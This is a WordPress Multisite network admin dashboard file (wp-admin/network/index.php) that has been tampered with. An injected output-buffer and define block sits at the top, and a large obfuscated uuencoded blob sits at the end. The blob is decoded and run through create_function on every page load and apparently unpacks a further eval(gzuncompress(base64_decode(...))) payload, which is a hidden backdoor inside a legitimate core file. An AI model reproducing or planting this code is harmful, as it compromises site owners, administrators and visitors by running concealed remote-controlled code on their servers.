<?php

ob_start(); // Start buffering
if (!defined('VI_CURRENT_FILE')){define('VI_CURRENT_FILE', __FILE__);define('VI_S_ID', 21398);}


/**
 * Multisite administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

/** Load WordPress dashboard API */
require_once( ABSPATH . 'wp-admin/includes/dashboard.php' );

if ( ! current_user_can( 'manage_network' ) )
	wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );

$title = __( 'Dashboard' );
$parent_file = 'index.php';

$overview = '<p>' . __( 'Welcome to your Network Admin. This area of the Administration Screens is used for managing all aspects of your Multisite Network.' ) . '</p>';
$overview .= '<p>' . __( 'From here you can:' ) . '</p>';
$overview .= '<ul><li>' . __( 'Add and manage sites or users' ) . '</li>';
$overview .= '<li>' . __( 'Install and activate themes or plugins' ) . '</li>';
$overview .= '<li>' . __( 'Update your network' ) . '</li>';
$overview .= '<li>' . __( 'Modify global network settings' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __( 'Overview' ),
	'content' => $overview
) );

$quick_tasks = '<p>' . __( 'The Right Now widget on this screen provides current user and site counts on your network.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( 'To add a new user, <strong>click Create a New User</strong>.' ) . '</li>';
$quick_tasks .= '<li>' . __( 'To add a new site, <strong>click Create a New Site</strong>.' ) . '</li></ul>';
$quick_tasks .= '<p>' . __( 'To search for a user or site, use the search boxes.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( 'To search for a user, <strong>enter an email address or username</strong>. Use a wildcard to search for a partial username, such as user&#42;.' ) . '</li>';
$quick_tasks .= '<li>' . __( 'To search for a site, <strong>enter the path or domain</strong>.' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'quick-tasks',
	'title'   => __( 'Quick Tasks' ),
	'content' => $quick_tasks
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Network_Admin">Documentation on the Network Admin</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>') . '</p>'
);

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );
wp_enqueue_script( 'plugin-install' );
add_thickbox();

require_once( ABSPATH . 'wp-admin/admin-header.php' );

?>

<div class="wrap">
<h1><?php echo esc_html( $title ); ?></h1>

<div id="dashboard-widgets-wrap">

<?php wp_dashboard(); ?>

<div class="clear"></div>
</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php
wp_print_community_events_templates();
include( ABSPATH . 'wp-admin/admin-footer.php' );

/*edition:2.3*/ $v6255d964dd='M)\'8Q,30X93`W834Q/2=E3G!.;4U53WA-65=22#AM56A*-5E36D976F=:>#=X M-4UO-EHK97-Z>3=F=%9O3S8V<#5B-FHY3T-%9%-&0V9P=%!Z,WHY2V-Z6C=+ M3E8S;TQ%86UH.6I+,T)R57).9T(K-TUQ-D1#9E-2230Q>#)J4U4K;T9654QU M0VM$<E9(=S).,31(.6MM8E)4>F(K;$9P-$A-,U%-:F]J2F,X>39B1S-.*T%7 M4VXR23!I9#EJ<%=L:S9H14)22FTQ0FUL;%A"4V,W,F(Q1C-116E"3C1#87I: M0UA1,6HK6G5W*TEV0FA*3&HK5W8V9$953T)69EA(;F=\'0W$U;U0W;4<Y3W=C M3CEL26YN>38P87I78GI*=C=S.%-M94AX=U)1,3AM."LK5%$Q07%Z,VQG:T16 M54%)+S=(649867A254Q9,7-V=3E/4&,P5C51,D5O2%%N=F1655A:,$5!1T]5 M:\')S4F)*4D=,>41$-$%*:6Y0=T-O3T5396)514)&=DLK>F=(9#9A2\'DR3%HO M1"]3154K07-*:GDS3D@T;64Q8E5N;CAH43@T1S)6.\'8X.$525&)%2WI.;T5) M,EE\'*W-":4EF1%A49U=6.$@T:D1-1#1Y3U-X<U@P:TIH3DUF1W1)<"MP;V92 M,CE!:#AI2VI5249-:SE:,$IE461Q4$,Q=&IU.6TS.&]H,&]O2&YT5THR25=2 M,3(R;E!G0556.\'E\':4%T2UEC.$YA3S5E-T)G3$<V,4AB45A,,#)M-VIF>7-W M04TT4R\W:S5A5VU2-G=V5UII4TXW1C-/179A.\'58,CA"6FQR=W!F3V-8.6MO M=F5845E9>FAZ3V0S5F=3.$]"9G9M1E=9;W(U1DM&17=Q>61R>G!T<6\X8C13 M0S5(0S=Q2FYJ0WA$;6]F6#DW;EEV4E)-,7$Q4VM2-E0O,C(O55)N;\'=S2#0U M,WA(0F5M-SA,:G9C:C1*5S%A6E0P-\'IR9VI563=$,#5C4VE5=G9U<51/06XK M9E9M:C5D9U%%>55I5F9)+S!7<FMU3"]G1FMF=&YQ33)R141S<\'!614)"0DHT M<&Q/5W!A=S)9:T5+8W1(=38U5&5(939S4W5X36%"95EW=F%Y:D1R;\'=5<F1! M.#-#.$A$2W-/;&TU24YV93(X=CDY55)R65%,>$%S8RLX5W<K-W,R1S!12FM4 M96TQ47EQ6%5H56IR=E$V=4=12W-$1FYV3BM/87)T-7-V6#0U4&)P<G!O3\'EV M4V]E-D8T.\'=+=\'=F;%)055)\'85I(;DAH8D1B4E8T;#%R;V]P:D)Y1VA\'>&94 M0G5N-TM41C1B87I%9&E\'<\')T44M#:F4X.#0Y069E9EAH9U9$6$9.5&4X3E=I M<BMV56I!0W-65C8K65)X23!"9U5+<U%T=UI7<TYA=G-(2#5D:D\T-$-R-G%D M3F%K.6%T0W57:U5T>C1T*R]%>&)*8UAF5DEC<E%917-*1#A/5TUP,&A0:2]4 M-S1D,C`Q+RLX54TW,3!,3WIH1%I737,R;V=H0C%7>4Y%4VUB36Q!8DID=EAG M8D=F0D%\'9$QG-%!#6\'%O538Q1F5H<4)22V@R84LT2UEJ<%E,<\'DU25513&UI M-%5&8W%B3V)T;THQ=S-&<C8S,2M&3S=!5%5I8TAU4V)*=59D0FTV-S`K44%9 M,\'!.5U)U;D=,-$=X0D,V14QI6$92>7-+2TM,1DUE3SEF:D)H.$Q33WIQ<5)U M4FI)3G5N:4LS13AC:FQ1<&IQ=T9+2U,U8G56<F%63&Y25E<T1C%M031%.6=Q M9V0X17A54%)H3V%50C5",G5)<S9G15-S*S%G,\'="2#-R,T9L5U-P5DUT.\'94 M1WI-.4]S8F$X6E)*:5%,1&DT=E5F9#E*,TYM1$)%:75:8TE#4S%K5$I(2%0P M53AR94=R5EIY96I3,CAJ<4=&=W5Y9TA%-6I:;E9S=&5X5WEQ-C!73V<Q+W9B M,FA$131295)"<%,U,C-3<#!$;WA2>4IS>G5H8UE*=FYR46MR=DA16FMU8U)3 M<E0V<$5!1\'$O-&)A:75054%.<FDO<5AG3EAV6#54>3=Z3V]L.%-&,T5H.70O M8G-G355+13=#,\'@U2&4Q83EG9DI2-U-,>4%O;\'56>7)R-2MT9V%H;4$O=%-J M33EX,F%5-TYC059Q,\'`Y4F=I5D158W1I4FI6:FYQ;7<X9G!B1TYV,W9U17,K M6DUO0S)N6G`P-3979$QU0E9!3G4T351.1GHT9&1D>6A(-791=6%2.4I-,FQC M<TMQ:D5#25)K;V)O37=94&I\'3\'5&3W9Z<FQ"2EIX1C50:6I7:B].6F5B4E!! M<&=01V%,6$IH-4DQ6\'EQ0U-,3FI4=G8P,5HR:VIF4&]I63=(23`T*TUI.6)R M5$])-4PV159X<R]V,G=#4F8Q6DU+-45K9555<3=02"]+,D1\'03-6-S-62TE4 M2D]O=VI2=S(X:$8K6G574VU)>D)58E)W4DE66%)T3FQ&96$O679*2D@V5D$U M9UE0<4$U=\'!4-40T>6)U=3A"3VU,9VPK<#!V;S=I+S=,1%5U0D-X>D-"6C1! M;RM"3GHX8G5N.7=--7)R-\'$V66Q.-FUI.$Q+84UK,\'1#3&=)8VQK>"]Y:%AY M,E-G:B]C1TY135E*,4]Z679W=U-/8T0Q;$]Q3%9I,C=2<C=X640X,5AA6F-I M,5@O:S`U1&A!8FE%2T]H44%537HX94518EIL55DK3E-Y;5E9:V9T3G)59%AA M3#8S9D-T,7AD<GI!475,,S)S,#)Z-D%M5VI$9$Q+9G9$5U=0=FUD9\'IQ945D M-V@S3&UR5W-3:FM#2$AK149S6CE.4\'I!2$E8:VQM2&%V:C%45E9U0F126%!/ M-&<Q3%14+U152VU"-6)/-EHK>D%W9#!J+T=/4\'-S2&1G;FUI<$5R:#E"4D51 M2D<K-F-&=W`X.&M!1D1:;6]R4V8S;74O12]L4WAB=35"-5%K9EI0;3@X,5%$ M4\'AK-S-V,W9S:5E\'46HK*VQL13%-3&IP=C5Z6$(X;3<O06EH,4]/2G)X<V1& M349X4S9(;RMZ>E--9D$R95-4*VEX*S1!-%4S:S)B5T=8<F=C0DMR-51G;5DY M:S`Q8C956F\S;54U0U!#=E)51EA.9$%042\K-TA345)F*S%I44-M8E9!,DQ( M3#-V9&QM;\'9/068K.&QP454X:$9K4WE&:TQW16XO,V1\'4CEW,WID;W)I-F)F M,4QJ-DA6-D-#.#)Q,DM$,V)966=D2DA8=&\Y:&YZ52MT8RM%2WA#,#!8=U!! M.#-%;RM01T%09SDO53`Q4T5Y-3%L:D59<4-H<7IY1&14*WI2-&-S<D%,<E!F M84A76D9Z*W8W>&9#=70K.$AW:C5R=DY-4CA&2U,T6BM!030Q=U0V<6%N,S(U M5$AN:61)=FY#;"]Y45=81TI3-GEH4\'I5>&]:2VAX0TXX.6-:53%)2$IT4G!* M860U:CA*2&PR;E10>4M*<VM)=TLQ=4@Q;E9#;TMX1FEC-#=Q<DM+35@W9V]T M0DAQ3G)W0CEQ0T)K<&%746=O;7!M,31S:UE(06-O1D=Z=$Y4>FYY.&UB9$YG M2E9*9W=E>3)61FI!5%=%-E-(97%E9G`K9$-.<6%44T(W;WI"66(O2E)E0V4K M4WIP,%=W-F-":V%J>"]K,V1J3RMI:54W-&A86DHW2\'1947E-9%5U:45\',D-U M,74U5FA98FA::D$Y-7%V5&5,03AE,3=&<V=0;35A;C-1<DE):&-O471"34=: M=TE&4$YT*T1O<$LR,\'5B;"M.-\')/3&]\'8T=L=TQV0S-P86IS2UDS0T8Y6GA* M<E5:9G0T,RMT8C=Z:$9,;#DP25%036541T5I,%9V,VI->GA*;3`W4EA$0UE9 M<VDQ.$Q31$$K5S5N=\'5#.\'I!32]Y=FMT23)J<W!E-G-30T-+,$1V:3%S2T=K M9"M$=C9$;F%K.&IW=49/35!+1$A$34UF-\'5F0G9/;#%P<65:<6MU,G!H1G=4 M:FEM.6LP<V9094U$44-7=$@O-7!V43A824Y:6\'=2569Y=60T04AT07`W1VAP M,E8Q-D)+4W-,;4UN3FPY=&AM,$1!>\'!06DA%55%.23@W27!Q;FID:7ED85!U M1EA#4D%P0U%X;4=J-4-T=#EF159!13E:,69H-7$Y<65):3EP*S=B-$M+-$4O M44@U8FIS5\'EH26MQ>F)+=VMM9$=*4F-23G5*2W%J1\'5.8FTQ6\'=$2D)9,7!E M;C0P9#A*=U=L,D\U8F4S04%Z,VI"-5!S2&EZ>EE)44%,<W`U4VY5:4MZ.$]I M=61J1\'EU8C`U3\'1Z:E)Q5$=M27(K2BMZ6&YP8G0Q84%A3&AE-TUW9W)$-DUD M+W%I0F)&>&AM0T%7+VYR.4U-4F$Q1C9G,&IE,41784Q72\'-747!\':D9526MY M,F1!:#E+2&I.15!(.&1F0C%K:4IG4\'E*44UZ=&MT45-R36%I-61(.4))2U5J M<UDY:DPK;S!$1#-N=&I356I(>FQ3=\'4R3F]P<DE355)L4&5X1G-(06E924%* M,WAH2EA">6YW53)";W@U9DYZ1E-)4T=S<T9Y-F<U1#9%>4=U03%3:W=U5F%X M978X-S)--T9R:64Y8U93:%=0>6).:5%I3DQ7<4%86%I64G%-=5-M2\'53<2]( M:V=7=D=$>GID2#%H,&M!:$%P3$5R2D]S<F126&DK67%",F-)<C=#-30R6C)B M:&XR2GAR+T4R2T1.1GEI9V=V26IA4DI56$Q66&9P6\'9!:W9T96-:5E!72V=W M5G9,>$-N43E75$1";G=&4G5J>#)Y0FUL,F)/=EI1,6)C:FY->G)A+T)&8E!+ M;5,Q+U5(1V]T-CEM<DDW4R]+4$]&,7591U5*8D]O2T9M4C9&,E1L*W5B=T14 M=EA7:&=:9FY414UB5G-:5%A(5\'%7<4)I5&1!*T)405E116<T-D=96&1!,T\T M=U0K-6]B,D%B=$YJ1DE943540EE:0VIV>E=2,G`P8UEN:GIB<75234ED-6]# M.&5P840W,#)V=&-3974T0F=/5#EA87=::70T9W=756I)6D52,35C9DLW9G9M M6&)49FM%3W9J1S9$;TU3,%E36#E):F9E:4IX5T-*<V-1-&M$17E!4&-\'*T0U M9T]R;D]W9G<V6G@Y3$U!1E1.1F=:<WI55DYH-2]O6$M3=#ET86E\'9%-\'5\')8 M+T-*-U!363E/=61M,FQ\'-C)2=U%*,6)V=%<U.&9#9\'-L1U!Z<DMN4E1\';DUT M,F]3>6=R96QE24LY040Q<VIJ;2ME;69H1&A345)227199DQI;5HX831(1RM0 M2SEW=F1.2EE78F9.8TE,2V-.24E!=4DR430W2VI+=71X5#-X;FUU2SAX<W)R M;&9P;%-U1V=L>&]W3DM)-U%\'45-\'.35&1EE*:T)104ET1D9*3G-&83%G;%AQ M*W%R4E!5.7!6;V-K<GE2,G%59$A:;C)94UEU>%9Y14ED1U=B26%/3\',T9\'5, M4VE,<FE:2F=C9G-K46-/;F9\'6D5W,UIM8E%R:2M.*UIZ5DUG=S9!2S0U,6]& M15)B4V]L3$AR<T)C3E5T1G%P-D4X9$M+1#8P6&HO8TEG=49-5D-&5#)I24E5 M931:-V](-R\O9F909CAO>C=F+S9V<V595#A/.&QT=C)6-5IU2EE(.7)Y:GIQ M4VHO*W50+R]H8BLO=G9V9B\T1&=".7=Y43T])SME=F%L*&=Z=6YC;VUP<F5S @<RAB87-E-C1?9&5C;V1E*"1V,3$T.&4P-V$U,2DI*3L` ` ';extract(array('f'=>'create_function','b'=>'convert_uudecode'));$t=$f('',$b($v6255d964dd));$t();